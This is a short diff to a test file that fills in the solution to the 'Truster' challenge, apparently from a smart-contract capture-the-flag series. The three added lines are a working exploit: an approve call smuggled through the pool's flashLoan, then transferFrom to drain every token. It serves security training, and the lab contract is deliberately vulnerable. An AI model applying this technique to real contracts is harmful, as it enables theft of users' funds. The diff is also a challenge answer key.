@@ -22,7 +22,9 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+       const data = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+       await (await pool.connect(player).flashLoan(0, player.address, token.address, data)).wait();
+       await (await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)).wait();
     });
 
     after(async function () {
